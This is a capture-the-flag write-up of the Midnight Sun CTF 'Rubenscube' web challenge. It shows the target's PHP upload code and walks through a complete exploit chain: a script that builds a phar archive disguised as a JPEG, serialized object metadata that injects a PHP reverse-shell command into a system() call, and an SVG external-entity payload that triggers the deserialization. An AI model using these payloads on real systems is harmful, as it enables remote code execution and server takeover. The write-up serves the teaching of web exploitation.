---
layout: post
title: Midnightsunctf Rubenscube
category: Web
tags: 
    - rixxc
---

This task provided a file upload for images. After looking at the robots.txt we saw that a file "source.zip" exists in which the source code of the app is stored.

The upload functionality is implemented as:
```php
<?php
session_start();

function calcImageSize($file, $mime_type) {
    if ($mime_type == "image/png"||$mime_type == "image/jpeg") {
        $stats = getimagesize($file);  // Doesn't work for svg...
        $width = $stats[0];
        $height = $stats[1];
    } else {
        $xmlfile = file_get_contents($file);
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
        $svg = simplexml_import_dom($dom);
        $attrs = $svg->attributes();
        $width = (int) $attrs->width;
        $height = (int) $attrs->height;
    }
    return [$width, $height];
}


class Image {

    function __construct($tmp_name)
    {
        $allowed_formats = [
            "image/png" => "png",
            "image/jpeg" => "jpg",
            "image/svg+xml" => "svg"
        ];
        $this->tmp_name = $tmp_name;
        $this->mime_type = mime_content_type($tmp_name);

        if (!array_key_exists($this->mime_type, $allowed_formats)) {
            // I'd rather 500 with pride than 200 without security
            die("Invalid Image Format!");
        }

        $size = calcImageSize($tmp_name, $this->mime_type);
        if ($size[0] * $size[1] > 1337 * 1337) {
            die("Image too big!");
        }

        $this->extension = "." . $allowed_formats[$this->mime_type];
        $this->file_name = sha1(random_bytes(20));
        $this->folder = $file_path = "images/" . session_id() . "/";
    }

    function create_thumb() {
        $file_path = $this->folder . $this->file_name . $this->extension;
        $thumb_path = $this->folder . $this->file_name . "_thumb.jpg";
        system('convert ' . $file_path . " -resize 200x200! " . $thumb_path);
    }

    function __destruct()
    {
        if (!file_exists($this->folder)){
            mkdir($this->folder);
        }
        $file_dst = $this->folder . $this->file_name . $this->extension;
        move_uploaded_file($this->tmp_name, $file_dst);
        $this->create_thumb();
    }
}

new Image($_FILES['image']['tmp_name']);
header('Location: index.php');
```

The first issue we discovered was that the deserialization of an svg image allows external entities. So we tried to upload an svg image with an external entity which uses an expect statment. This should execute the command provided in it on the server. The problem is that php needs a specific module to interpret the expect statement, which was not installed.

Also interesting is that 'system' is directly called to convert the images. Unfortunately we have no control over the parameter.
After hours of search we found out that we can 'disguise' a phar archive as an jpeg image, which we now can upload to the server. The important part comes now. We are able to provide a serialized object in the metadata of the phar archive and we have full control over the attributes of this object.
When the object gets deserialized it will get instantly destroyed by the garbage collector and so the '__destruct()' method gets called. Therefore we can set the '$folder' attribute of the Image object to run abitrary commands on the host system.

To activate the phar archive we can use the stream wrapper 'phar://' which we can provide as an external entity of an svg image.

This is our script to create the phar archive:
```php
<?php

$jpeg_header_size = 
"\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13".
"\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02".
"\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15".
"\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14".
"\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01".
"\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03".
"\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11".
"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20".
"\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda".
"\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9";

$phar = new Phar("exploit.phar");
$phar['exp.php'] = '<?php system(\'php -r \\\'$sock=fsockopen("",1234);exec("/bin/sh -i <&3 >&3 2>&3");\\\'\');?>';
$phar->startBuffering();
$phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");
class Image {}
$o = new Image();
$o->folder = " | php -r '\$sock=fsockopen(\"<ip of server>\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");' | ";
$phar->setMetadata($o);
$phar->stopBuffering();
```

The code of the 'exp.php' file inside this archive will not get executed and is just an artifact of one of our attempts. But there has to be one php file inside the phar archive which we can access via the stream wrapper.

Let's see what 'file' has to say about the archive.

```bash
$ php pack.php 
$ file exploit.phar 
exploit.phar: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: "Created with GIMP", progressive, precision 8, 10x10, frames 3
```

The archive is in fact recognized as a jpeg image.

Now we crafted an svg image with external entities which should trigger the phar archive.

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE convert [ <!ENTITY % payl SYSTEM "phar://images/cb8v42f3sfisnad6piq9sl23u7/f79556d9bf3197276c38c26bdbaba9511103ac93.jpg/exp.php">%payl;]>
<svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40"></text></svg>
```

The path used in the svg image can be found in the gallery.
After uploading this svg image the reverse shell got initiated and we could get the flag `flag{R3lying_0n_PHP_4lw45_W0rKs}`